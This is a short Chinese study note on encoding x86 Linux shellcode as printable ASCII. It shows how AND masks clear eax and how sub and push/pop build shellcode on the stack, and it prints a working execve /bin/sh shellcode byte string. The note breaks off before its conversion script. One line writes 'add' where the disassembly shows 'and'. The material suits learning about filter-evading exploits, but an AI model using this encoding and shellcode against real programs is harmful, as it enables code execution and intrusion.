简介 : 
```
可打印字符
```
经验 : 
```
(发现一个经验 , 如果需要反复对内存进行 malloc/free 操作的时候 , malloc后要 memset(pointer, 0 , size))
参考文章 : http://blog.csdn.net/baijd_ss/article/details/6741855
```
环境 : 
```
Linux x86
```
分析 : 
```
可打印的指令 : 
	and eax, [NUMBER]		
	sub eax, [NUMBER]
	push eax
	pop eax
	push esp
	pop esp
```
方法 : 
```
1. 使用 and 来清空 eax 
2. 在 eax 清空后 , 可以使用 sub 指令来将 eax 设置为任意值 (缠绕的思想)
3. 通过 (push eax , pop esp) 以及 (push esp , pop eax) 可以进行 esp 和 eax 之间的数据转移
4. 这样就可以首先将已经写好的一段 shellcode 使用第 1 步和第 2 步进行转换
5. 转换的结果当然都是可打印字符 , 这样编码完成后 , 我们就可以使用第 2 步来将真正的shellcode压入栈
6. 调整栈指针 , 让 shellcode 执行
```
可打印字符的特点 : 
```
ASCII 的范围是 32 - 127
也就是 : 
0010 0000 - 0111 1111
我们如何来使用只有 ASCII 的指令将 eax 清空呢 ? 
01010101 & 10101010 = 0
[I] & [0] = 0 (0x49, 0x30)
这样就可以达到清空的效果 , 当然这个也可以随意调整 , 只要能保证按位与之后为 0 即可
add eax, 49494949H
add eax, 30303030H
汇编之后的机器码为 : 
8048065:	25 49 49 49 49			and    $0x49494949,%eax
804806a:	25 30 30 30 30			and    $0x30303030,%eax
可以看到都是可打印字符 , 而且已经绕过了诸如 : * / \ 这样的特殊字符
```
一段正常的shellcode : 
```
\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80
```
我们现在要使用 sub 指令来将 eax 一个一个调整为 shellcode 中的数据
然后再将其压到栈上
首先看第一个 : 
\x31\xc9\x51\x68
为了提高效率我们这里可能需要写一个脚本来进行运算

